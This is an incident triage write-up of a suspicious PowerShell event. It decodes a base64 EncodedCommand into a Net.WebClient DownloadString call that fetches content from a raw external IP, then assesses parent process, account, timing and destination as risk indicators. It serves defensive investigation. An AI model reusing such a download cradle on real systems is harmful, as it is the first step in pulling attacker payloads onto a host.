# Investigation — Case 001

## Step 1: Decode the Base64 Payload

Command used:
```powershell
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("JABzAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMwA5AC4ANQA5AC4AMQA0ADgALgAxADAAMAAvAHQAZQBzAHQALgB0AHgAdAAnACkAOwBXAHIAaQB0AGUALQBPAHUAdABwAHUAdAAgACQAcwA="))
```

**Decoded output:**
```
$s=(New-Object Net.WebClient).DownloadString('http://139.59.148.100/test.txt');Write-Output $s
```

**Finding:** 🔴 Command uses `Net.WebClient.DownloadString` to fetch content from a **raw external IP** (`139.59.148.100`) — not a domain, not an internal/corporate resource.

---

## Step 2: Check Parent Process

`Creator_Process_Name` = empty across all 3 events.

**Finding:** ⚠️ Parent process not captured in logs. This is a gap, not a clean explanation — an unexplained/missing parent does not reduce suspicion; it should be treated as an open investigative question.

---

## Step 3: Check Account Context

Account: `hp` — the standard interactive user on this host, not a service account. No indication this account normally runs scripted downloads from external IPs.

---

## Step 4: Check Timing / Repetition

3 identical `-EncodedCommand` invocations within **1.4 seconds** (15:45:11.041 → 15:45:12.401).

**Finding:** 🔴 This pattern does not match:
- A human manually running a command (too fast, identical repeats)
- A scheduled Defender/AV scan (would not use EncodedCommand + WebClient download)

Matches a scripted/automated execution pattern.

---

## Step 5: Check Destination

`139.59.148.100` — bare IP address, no reverse DNS validation performed, no known business justification on this host.

**Finding:** 🔴 External IP with no legitimate purpose = high-risk indicator.

---

## Summary of Findings

| Check | Result | Risk |
|---|---|---|
| Decoded content | Downloads from external IP | 🔴 High |
| Parent process | Unknown/empty | 🟠 Gap — needs escalation |
| Account | Standard interactive user | 🟡 Neutral |
| Timing | 3x in 1.4 sec, scripted pattern | 🔴 High |
| Destination | Raw IP, no justification | 🔴 High |
